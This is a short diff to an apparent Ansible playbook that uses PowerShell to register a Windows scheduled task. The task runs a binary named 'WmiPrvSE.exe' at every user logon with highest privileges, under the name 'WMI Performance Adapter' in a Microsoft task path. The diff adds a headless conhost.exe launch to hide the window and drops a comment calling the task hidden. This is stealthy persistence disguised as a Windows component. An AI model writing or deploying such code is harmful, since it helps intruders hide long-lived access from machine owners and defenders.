@@ -25,8 +25,7 @@
 
     - name: Create Persistent Task for All Users
       ansible.windows.win_shell: |
-        # Create a hidden task that runs on any user logon
-        $Action = New-ScheduledTaskAction -Execute "{{ target_dir }}\WmiPrvSE.exe" -ArgumentList "client"
+        $Action = New-ScheduledTaskAction -Execute "conhost.exe" -Argument "--headless ""{{ target_dir }}\WmiPrvSE.exe"" client"
         $Trigger = New-ScheduledTaskTrigger -AtLogOn
         $Principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest
         Register-ScheduledTask -TaskName "WMI Performance Adapter" -TaskPath "\Microsoft\Windows\WMI" -Action $Action -Trigger $Trigger -Principal $Principal -Force
